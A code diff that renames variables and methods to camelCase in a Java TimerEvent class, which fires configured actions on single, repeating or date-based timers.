@@ -23,8 +23,8 @@ public class TimerEvent extends Event {
     private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);
 
     int type;
-    long lo_delay;
-    long hi_delay;
+    long loDelay;
+    long hiDelay;
 
     Date timestamp;
 
@@ -32,14 +32,14 @@ public class TimerEvent extends Event {
         super(Event.EVENT_TIMER, actionId, confParams);
     }
 
-    public TimerEvent(int actionId, int type, int lo_delay, int hi_delay) {
-        super(Event.EVENT_TIMER, actionId);
-        this.type = type;
-        this.lo_delay = lo_delay;
-        this.hi_delay = hi_delay;
+    public TimerEvent(int actionId_, int type_, int loDelay_, int hiDelay_) {
+        super(Event.EVENT_TIMER, actionId_);
+        this.type = type_;
+        this.loDelay = loDelay_;
+        this.hiDelay = hiDelay_;
     }
 
-    protected void EventRun() {
+    protected void eventRun() {
         debug.trace("EventRun");
         Check.requires(statusObj != null, "StatusObj NULL");
         timestamp = new Date();
@@ -51,7 +51,7 @@ public class TimerEvent extends Event {
             case Conf.CONF_TIMER_SINGLE:
                 debug.trace("TIMER_SINGLE");
 
-                wait = lo_delay;
+                wait = loDelay;
                 now = new Date();
 
                 /*
@@ -61,9 +61,9 @@ public class TimerEvent extends Event {
                  * timestamp.getTime())+" wait:"+wait);
                  */
                 if (now.getTime() - timestamp.getTime() > wait) {
-                    debug.trace("triggering:" + ActionId);
-                    statusObj.triggerAction(ActionId);
-                    Stop();
+                    debug.trace("triggering:" + actionId);
+                    statusObj.triggerAction(actionId);
+                    stop();
                     return;
                 }
 
@@ -71,18 +71,18 @@ public class TimerEvent extends Event {
             case Conf.CONF_TIMER_REPEAT:
                 debug.trace("TIMER_REPEAT");
 
-                wait = lo_delay;
+                wait = loDelay;
                 now = new Date();
 
                 if (now.getTime() - timestamp.getTime() > wait) {
                     timestamp = now;
-                    statusObj.triggerAction(ActionId);
+                    statusObj.triggerAction(actionId);
                 }
             case Conf.CONF_TIMER_DATE:
                 debug.trace("TIMER_DATE");
 
-                long tmpTime = hi_delay << 32;
-                tmpTime += lo_delay;
+                long tmpTime = hiDelay << 32;
+                tmpTime += loDelay;
 
                 Date tmpDate = new Date(tmpTime);
                 debug.trace(tmpDate.toString());
@@ -90,8 +90,8 @@ public class TimerEvent extends Event {
                 now = new Date();
 
                 if (now.getTime() > tmpTime) {
-                    statusObj.triggerAction(ActionId);
-                    Stop();
+                    statusObj.triggerAction(actionId);
+                    stop();
                     return;
                 }
 
@@ -105,25 +105,25 @@ public class TimerEvent extends Event {
                 break;
             }
 
-            if (EventSleep(SLEEP_TIME)) {
+            if (eventSleep(SLEEP_TIME)) {
                 debug.trace("EventSleep exit");
                 return;
             }
         }
     }
 
-    protected boolean Parse(byte[] confParams) {
+    protected boolean parse(byte[] confParams) {
         DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
 
         try {
             this.type = databuffer.readInt();
-            this.lo_delay = databuffer.readInt();
-            this.hi_delay = databuffer.readInt();
+            this.loDelay = databuffer.readInt();
+            this.hiDelay = databuffer.readInt();
 
             debug
-                    .trace("type: " + type + " lo:" + lo_delay + " hi:"
-                            + hi_delay);
+                    .trace("type: " + type + " lo:" + loDelay + " hi:"
+                            + hiDelay);
 
         } catch (EOFException e) {
             debug.error("params FAILED");
